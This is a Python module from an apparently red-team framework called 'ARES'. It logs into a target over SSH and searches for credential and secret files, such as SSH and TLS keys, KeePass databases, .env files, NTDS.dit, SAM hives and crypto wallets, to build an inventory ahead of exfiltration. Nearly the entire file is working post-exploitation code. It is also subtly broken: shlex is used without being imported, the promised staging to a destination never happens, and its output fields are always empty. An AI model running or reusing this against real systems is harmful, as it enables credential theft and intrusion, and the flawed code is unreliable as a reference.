"""
Staged File Collection
MITRE: T1119 (Automated Collection), T1039 (Data from Network Shared Drive)

Searches for high-value files matching sensitive patterns, stages them
to a temporary collection directory on the target, then reports inventory.
Does NOT transfer files to operator (use separate exfil module after review).

Patterns: credentials, keys, configs, databases, source code secrets.
"""
from __future__ import annotations
import asyncio
from typing import Any
from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.exfil.staged_collection")

_COLLECTION_PATTERNS = [
    "*.kdbx", "*.pfx", "*.p12", "*.pem", "*.key", "*.ppk",
    "*id_rsa*", "*id_ed25519*", "*.jks", "*.keystore",
    "*password*", "*passwd*", "*credential*", "*secret*", "*token*",
    "*.config", "web.config", "app.config", "*.conf",
    "*.env", ".env", "*.env.local",
    "NTDS.dit", "SAM", "SYSTEM", "SECURITY",
    "*backup*.sql", "*dump*.sql", "*.bak",
    "*wallet.dat", "*.wallet",
]

class StagedCollectionModule(BaseModule):
    """
    exfil.staged_collection — "Search for high-value files (credentials, keys, configs, backups

    OPSEC: MEDIUM
    MITRE: "T1119", "T1039", "T1552"
    REQUIRES: "lateral_session"
    OUTPUTS:  "sensitive_file_paths", "collection_inventory"
    """
    MODULE_ID          = "exfil.staged_collection"
    MODULE_NAME        = "Staged File Collection"
    MODULE_CATEGORY    = "exfil"
    MODULE_DESCRIPTION = (
        "Search for high-value files (credentials, keys, configs, backups) "
        "and report inventory before exfiltration decision"
    )
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["lateral_session"]
    OUTPUTS            = ["sensitive_file_paths", "collection_inventory"]
    MITRE_TECHNIQUES   = ["T1119", "T1039", "T1552"]
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "exfil.staged_collection requires 'target'.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("destination"):
            raise ModuleValidationError(
                "exfil.staged_collection requires 'destination' — "
                "UNC path or remote share to stage files to.",
                module_id=self.MODULE_ID, field="destination",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID, raw={"dry_run": True})
        target   = getattr(ctx, "target", ctx.params.get("target", ""))
        username = ctx.params.get("username", "")
        password = ctx.params.get("password", "") or ctx.params.get("secret", "")
        key_path = ctx.params.get("key_path", "")
        platform = ctx.params.get("platform", "linux")
        search_paths = ctx.params.get("search_paths", ["/home", "/root", "/etc", "/var/www", "/opt"])
        findings, raw = await self.run(target=target, username=username, password=password,
                                        key_path=key_path, platform=platform,
                                        search_paths=search_paths)
        return ModuleResult(status="success" if findings else "partial",
                            findings=findings, raw=raw, module_id=self.MODULE_ID,
                            execution_id=getattr(ctx, "execution_id", ""))

    @trace_module("exfil.staged_collection")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target       = kwargs.get("target", "")
        username     = kwargs.get("username", "")
        password     = kwargs.get("password", "") or kwargs.get("secret", "")
        key_path     = kwargs.get("key_path", "")
        platform     = kwargs.get("platform", "linux")
        search_paths = kwargs.get("search_paths", ["/home", "/root", "/etc"])
        known_hosts  = kwargs.get("known_hosts_file")
        dry_run      = kwargs.get("dry_run", False)
        max_files    = int(kwargs.get("max_files", 200))

        if not target or not username:
            return [], {"error": "target and username required"}
        if dry_run:
            return [], {"dry_run": True, "would_search": search_paths}

        await self.before_request(target, "ssh")  # scope check + jitter

        try:
            import paramiko
        except ImportError:
            return [], {"error": "paramiko not installed"}

        logger.info("staged_collection_start", target=target, paths=search_paths)
        audit("staged_collection", actor=username, technique="T1119",
              source="operator", target=target)
        await self.noise.rate_limiter.acquire("cloud_api")
        await self.noise.jitter.sleep()

        loop = asyncio.get_running_loop()

        def _collect() -> list[dict[str, Any]]:
            client = paramiko.SSHClient()
            if known_hosts:
                client.set_missing_host_key_policy(paramiko.RejectPolicy())
                client.load_host_keys(known_hosts)
            else:
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                logger.warning("ssh_host_key_unverified", target=target,
                               risk="MITM possible")
            kw: dict = {"hostname": target, "username": username, "timeout": 15,
                        "allow_agent": False, "look_for_keys": False}
            if key_path:
                kw["key_filename"] = key_path
            else:
                kw["password"] = password
            client.connect(**kw)

            hits: list[dict[str, Any]] = []
            for pat in _COLLECTION_PATTERNS[:15]:
                paths_str = " ".join(shlex.quote(p) for p in search_paths)
                cmd = f"find {paths_str} -name '{pat}' -type f -size -50M 2>/dev/null | head -20"
                try:
                    _, stdout, _ = client.exec_command(cmd, timeout=10)
                    for line in stdout.read().decode("utf-8", errors="replace").splitlines():
                        line = line.strip()
                        if line:
                            hits.append({"path": line, "pattern": pat})
                            if len(hits) >= max_files:
                                break
                except Exception:
                    pass
                if len(hits) >= max_files:
                    break

            client.close()
            return hits

        try:
            hits = await loop.run_in_executor(None, _collect)
        except Exception as e:
            return [], {"error": str(e)[:200]}

        if hits:
            by_type: dict[str, list[str]] = {}
            for h in hits:
                by_type.setdefault(h["pattern"], []).append(h["path"])

            self.finding(
                title=f"Sensitive Files Located on {target} ({len(hits)} files)",
                description=(
                    f"{len(hits)} sensitive file(s) found on {target} matching credential, "
                    "key, config, or backup patterns. Review inventory before exfiltrating."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1119",
                mitre_tactic="Collection",
                evidence={"target": target, "count": len(hits),
                           "by_pattern": {k: len(v) for k, v in by_type.items()},
                           "sample_paths": [h["path"] for h in hits[:20]]},
                remediation=(
                    "Restrict access to sensitive files. "
                    "Implement file integrity monitoring (FIM). "
                    "Remove unnecessary credential files from servers. "
                    "Use secrets management (Vault, AWS Secrets Manager) instead of config files."
                ),
                host=target, confidence=0.9,
            )

        raw = {"target": target, "files_found": hits,
               "search_paths": search_paths, "total": len(hits)}
        raw["sensitive_file_paths"] = raw.get("files_staged", [])  # OUTPUTS key
        raw["collection_inventory"] = raw.get("files_staged", [])  # OUTPUTS key
        return self._findings[:], raw
